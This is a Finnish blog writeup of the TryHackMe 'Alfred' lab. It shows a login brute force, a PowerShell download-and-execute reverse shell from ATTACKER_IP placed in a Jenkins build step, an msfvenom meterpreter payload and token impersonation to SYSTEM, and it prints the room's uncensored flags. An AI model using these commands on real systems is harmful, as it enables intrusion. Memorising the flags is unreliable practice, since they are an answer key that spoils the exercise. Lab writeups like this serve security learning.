---
title: "Alfred Writeup"
date: 2023-06-13
tags: [writeup, ctf, tryhackme]
description: "Jenkins-kirjautumisen bruteforcetus Burp Intruderilla ja PowerShell-reverse shellin ketjuttaminen token impersonation -privesciin TryHackMen Alfred-huoneessa."
---

Hei lukija!

Ennen kuin jatkat, halusin vain sanoa, että jos olet aloittelija, ÄLÄ KÄYTÄ TÄTÄ WRITEUPIA HELPPOIDEN TEIDEN OIKAISUUN. Kokeile palata aiempiin harjoitus-/infohuoneisiin ja kerrata ne, ja kokeile huonetta sitten uudelleen. Olen sisällyttänyt vastaukset, eivätkä liput (flagit) ole _sensuroituja_. Se ei kuitenkaan tarkoita, että sinun pitäisi vain kopioida ja liittää ne ja lopettaa siihen. Käytä tätä vain ja ainoastaan, jos olet todella ymmälläsi ja jumissa. 

Tämän sanottuani toivon, että tästä on hyötyä 😄

## Setup 

Meidän on ensin yhdistettävä tryhackmen VPN-palvelimeen. Saat lisätietoja tästä vierailemalla [Access](https://tryhackme.com/access) -sivulla.

Käytän openvpn:ää palvelimeen yhdistämiseen. Tässä on komento:

```
$ sudo openvpn --config NovusEdge.ovpn
```

## Tiedustelu

Nopea `nmap`-skannaus antaa meille hyödyllisiä tietoja:
```shell-session
$ sudo nmap -sS -vv -Pn --top-ports 2000 -oN nmap_scan.txt TARGET_IP

PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127
8080/tcp open  http-proxy    syn-ack ttl 127
```

> Kuinka monta porttia on auki? (vain TCP)
>
> Vastaus: 3

Käyttöjärjestelmän sormenjälkien tunnistus (OS Fingerprinting) sopivan hyökkäysvektorin löytämiseksi:
```shell-session
$ sudo nmap -O -Pn -vv TARGET_IP
...
...
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows 8.1 R1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%)
```

Voimme olla varmoja siitä, että palvelimella pyörii jokin Windows-käyttöjärjestelmä. Portissa 80 pyörii http-palvelin ja portissa 8080 välityspalvelin (proxy). Vierailemalla portin 80 sivustolla näemme:
![Port 80 web-page](/assets/img/writeup_assets/alfred/port-80-page.png)

Kun vieraillaan portin 8080 sivulla, meitä tervehtii seuraava:
![Port 8080 page](/assets/img/writeup_assets/alfred/port-80-login.png)

Verkkosivu on kirjautumisportaali, joten voimme käyttää `hydra`a tai burpsuiten intruder-työkalua sen bruteforcettamiseen ja tunnusten saamiseen.

Käytän burpsuitea sniper-hyökkäyksen tekemiseen saadakseni tunnukset...
![Burpsuite Intruder Attack](/assets/img/writeup_assets/alfred/burp-intruder.png)
![Sniper Attack](/assets/img/writeup_assets/alfred/sniper-attack.png)



Voimme yrittää kirjautua portaaliin näillä saaduilla tunnuksilla. 

> Mikä on kirjautumispaneelin käyttäjätunnus ja salasana (muodossa käyttäjänimi:salasana)
>
> Vastaus: `admin:admin`


## Pääsyn saaminen

Kun olemme kirjautuneet sisään portaaliin, näemme hallintapaneelin, jonka avulla käyttäjä voi tehdä kaikenlaista.
![Dashboard](/assets/img/writeup_assets/alfred/dashboard.png)

Hallintapaneelin `New Item` -työkalua voidaan sitten käyttää payloadin lataamiseen, joka suoritetaan reverse shell -yhteyden saamiseksi. Tätä varten tarvitsemme ensin reverse TCP shellin, joka käyttää powershelliä. Kuten huoneen ensimmäisessä tehtävässä ohjeistetaan, meidän tulee käyttää `nishang`ia tätä powershell-skriptiä varten. 

```shell-session
$ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```

Kun meillä on shell, voimme käyttää `NewItem`-työkalua tiedoston lataamiseen ja laittaa palvelimen suorittamaan seuraavan komennon:
```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:PORT/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port PORT
```

![](/assets/img/writeup_assets/alfred/initial-access-1.png)

Kun projekti on luotu, meidät ohjataan konfigurointiosioon, jossa voimme määrittää työnkulun suorittamaan aiemmin mainitun komennon:

![](/assets/img/writeup_assets/alfred/initial-access-2.png)

Ennen jatkamista meidän on käynnistettävä koneellamme http-palvelin, jotta etäpalvelin voi ottaa yhteyden ja hakea powershell-skriptin. 
***HUOMAA***: Skriptitiedoston on oltava nykyisessä työhakemistossa, jotta tämä toimii.

```shell-session
$ python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
```

Meidän on myös käynnistettävä listener reverse shelliä varten:
```shell-session
$ nc -nvlp 4445
```

Nyt kun tämä kaikki on tehty, voimme vihdoin suorittaa työnkulun klikkaamalla projektivalikon vasemmalla puolella näkyvää `Build Now` -vaihtoehtoa. Tämän tekeminen antaa meille shellin, jolla työskennellä:
```shell-session
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\alfred> cd C:\Users\bruce\Desktop
PS C:\Users\bruce\Desktop> type user.txt
79007a09481963edf2e1321abd9ae2a0
```

Olemme saaneet käyttäjän lipun (user flag) onnistuneesti, ja voimme nyt siirtyä oikeuksien korottamiseen. 

> Mikä on user.txt-lippu?
>
> Vastaus: `79007a09481963edf2e1321abd9ae2a0`

## Privilege Escalation

Jotta sitä olisi helpompi hallita, käytämme meterpreter-shelliä oikeuksien korotusosiossa. Ensin meidän on luotava payload reverse shellille:
```shell-session
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=ATTACKER_IP LPORT=PORT -f exe -o shell.exe
```
Tarvitsemme listenerin koneellemme:
```shell-session
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST ATTACKER_IP
LHOST => ATTACKER_IP
msf6 exploit(multi/handler) > set LPORT PORT
LPORT => PORT

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on ATTACKER_IP:PORT
```


Ladataan se koneelle lisäämällä build-vaihe (build step) projektin konfiguraatioon:
```powershell
powershell iex "(New-Object System.Net.WebClient).Downloadfile('http://ATTACKER_IP:PORT/shell.exe','shell.exe')"
```

Projektin buildaaminen antaa meille aiemman shellin, jossa voimme suorittaa seuraavan komennon:
```powershell
PS C:\Program Files (x86)\Jenkins\workspace\alfred> Start-Process shell.exe
```

Tämä luo meterpreter-shellin.


> Mikä on luomasi exe-payloadin lopullinen koko?
>
> Vastaus: `73802`

Nyt kun meillä on mukava meterpreter-shell, voimme kokeilla ja katsoa, mitä oikeuksia meillä on:
```shell-session
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > whoami /priv 

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```

Käyttäjällä `alfred` meillä on `SeDebugPrivilege`-, `SeImpersonatePrivilege`- ja `SeCreateGlobalPrivilege` -oikeudet käytössä. Lataamalla `incognito`-moduulin voimme sitten käyttää sitä tokeneiden listaamiseen:

```shell-session
PS > ^C
Terminate channel 1? [y/N]  y                                                             
meterpreter > load incognito                                                              
Loading extension incognito...Success.                                                    
meterpreter > list_tokens -g                                                              
[-] Warning: Not currently running as SYSTEM, not all tokens will be available            
             Call rev2self if primary process token is SYSTEM                             
                                                                                          
Delegation Tokens Available                                                               
========================================                                                  
\                                                                                         
BUILTIN\Administrators                                                                    
BUILTIN\IIS_IUSRS                                                                         
BUILTIN\Users                                                                             
NT AUTHORITY\Authenticated Users                                                          
NT AUTHORITY\NTLM Authentication                                                          
NT AUTHORITY\SERVICE                                                                      
NT AUTHORITY\This Organization                                                            
NT AUTHORITY\WRITE RESTRICTED
NT SERVICE\AppHostSvc
NT SERVICE\AudioEndpointBuilder
NT SERVICE\BFE
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\Dnscache
NT SERVICE\eventlog
NT SERVICE\EventSystem
NT SERVICE\FDResPub
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\MMCSS
NT SERVICE\PcaSvc
NT SERVICE\PlugPlay
NT SERVICE\RpcEptMapper
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\Spooler
NT SERVICE\swprv
NT SERVICE\TrkWks
NT SERVICE\TrustedInstaller
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\VSS
NT SERVICE\WdiSystemHost
NT SERVICE\Winmgmt
NT SERVICE\WSearch
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK
NT SERVICE\AudioSrv
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\DPS
NT SERVICE\lmhosts
NT SERVICE\MpsSvc
NT SERVICE\netprofm
NT SERVICE\nsi
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\ShellHWDetection
NT SERVICE\W32Time
NT SERVICE\WdiServiceHost
NT SERVICE\WinHttpAutoProxySvc
NT SERVICE\wscsvc
```

Koska `BUILTIN\Administrators`-token on saatavilla, voimme käyttää seuraavaa komentoa admin-tokenin impersonointiin:
```shell-session
meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
```

Ajamalla `getuid`-komennon voimme vahvistaa, että meillä on admin-oikeudet:
```shell-session
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

> Mikä on tuloste, kun suoritat getuid-komennon?
>
> Vastaus: `NT AUTHORITY\SYSTEM`

Kuten tehtävässä kehotetaan tekemään, migroimme nyt tämän prosessin:
```shell-session
meterpreter > ps
...

668   580   services.exe   x64   0        NT AUTHORITY\SYSTEM    C:\Windows\System32\se
                                                                  rvices.exe
...

meterpreter > migrate 668
[*] Migrating from 2176 to 668...
[*] Migration completed successfully.
meterpreter > cat "C:\Windows\System32\config\root.txt" 
��dff0f748678f280250f25a45b8046b4a
```

> lue root.txt-tiedosto polusta `C:\Windows\System32\config`
>
> Vastaus: `dff0f748678f280250f25a45b8046b4a`

## Yhteenveto

Jos tästä writeupista on apua, harkitse minun seuraamistani [githubissa](https://github.com/NovusEdge) ja/tai tähden antamista repositoriolle: https://github.com/NovusEdge/thm-writeups


- Huone: [Alfred](https://tryhackme.com/room/alfred)
